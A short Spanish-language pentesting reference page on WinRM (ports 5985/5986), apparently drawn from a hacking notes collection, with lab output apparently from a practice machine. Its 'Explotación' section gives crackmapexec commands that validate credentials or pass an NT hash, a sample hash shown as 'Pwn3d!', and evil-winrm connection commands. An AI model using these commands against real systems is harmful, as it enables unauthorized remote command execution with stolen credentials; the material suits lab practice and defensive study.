# Port 5985, 5986 - WinRM

WinRM (Windows Remote Management) es un protocolo de administración remota desarrollado por Microsoft para la administración de sistemas operativos Windows. WinRM permite a los administradores controlar y administrar de forma remota servidores y estaciones de trabajo Windows. A través de WinRM, los administradores pueden ejecutar comandos y scripts, obtener información del sistema, configurar el firewall, entre otras funciones de administración remota.

Los usuarios pertenecientes al grupo Remote Managment Users cuentan con capacidad de WinRm, por lo que si conocemos sus credenciales tendremos capacidad de ejecución remota de comandos.



## Explotación

Validar si un determinado usuario tiene capacidad de WinRM:

```bash
crackmapexec winrm <TARGET-IP> -u '<USER>' -p '<PASSWD>' [-H '<NT-HASH>']

crackmapexec winrm 10.10.10.192 -u 'svc_backup' --hash '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

```

Conectarse a este servicio con evilwinrm

```bash
gem install evilwinrm # Instalar evilwinrm 

evil-winrm -i <HOST> -u <USER> -H <NT-HASH> # connection
evil-winrm -i <HOST> -c <CERT> -k <KEY> -S  # ssl connection
```
